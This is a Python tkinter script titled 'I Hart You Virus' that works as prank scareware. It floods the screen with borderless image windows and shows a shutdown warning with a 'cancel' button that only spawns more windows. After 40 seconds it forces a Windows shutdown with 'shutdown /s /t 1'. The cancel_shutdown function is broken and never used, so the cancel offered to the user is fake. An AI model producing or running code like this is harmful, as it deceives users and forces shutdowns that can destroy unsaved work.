import os
import tkinter as tk
from threading import Timer
from PIL import Image, ImageTk
import random

def shutdown():
    shutdown_command = "shutdown /s /t 1"
    os.system(shutdown_command)

def cancel_shutdown():
    cancel_command = "shutdown /a" 
    os.system()
    root.destroy()  

def show_image(root):
    shutdown_label.pack_forget()
    cancel_button.pack_forget()
    
    image_path = "../image.jpg"  
    image = Image.open(image_path)
    photo = ImageTk.PhotoImage(image)

    image_label = tk.Label(root, image=photo)
    image_label.image = photo 
    image_label.pack(padx=50, pady=50)

    text_label = tk.Label(root, text="I miss you, balik kana >.<", font=("Tahoma", 30))
    text_label.pack(anchor="center") 

    button = tk.Button(root, text="Cancel", command=mul_image, width=20)
    button.pack(pady=10)

def mul_image():
    new_window = tk.Toplevel(root)
    
    new_window.geometry("300x300")
    
    screen_width = new_window.winfo_screenwidth()
    screen_height = new_window.winfo_screenheight()
    x = random.randint(0, screen_width - 300)
    y = random.randint(0, screen_height - 300)
    new_window.geometry(f"300x300+{x}+{y}")

    image_path = "../image.jpg"
    image = Image.open(image_path)
    photo = ImageTk.PhotoImage(image)

    image_label = tk.Label(new_window, image=photo)
    image_label.image = photo
    image_label.pack(padx=5, pady=5)

    new_window.overrideredirect(True)

def prompt_shutdown():
    global root, shutdown_label, cancel_button
    root = tk.Tk()
    root.title("I Hart You Virus")
    root.geometry("700x500")

    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    x = (screen_width - 700) // 2
    y = (screen_height - 500) // 2

    root.geometry(f"700x500+{x}+{y}")

    shutdown_label = tk.Label(root, text="Your PC is about to Shutdown.", font=("Tahoma", 12))
    shutdown_label.pack(pady=50, padx=30)

    cancel_button = tk.Button(root, text="Press to Cancel", command=mul_image, width=20)
    cancel_button.pack(pady=10)

    for _ in range(30):
        mul_image()

    Timer(10, show_image, args=(root,)).start()
    Timer(40, shutdown).start()

    root.overrideredirect(True)
    root.mainloop()

prompt_shutdown()

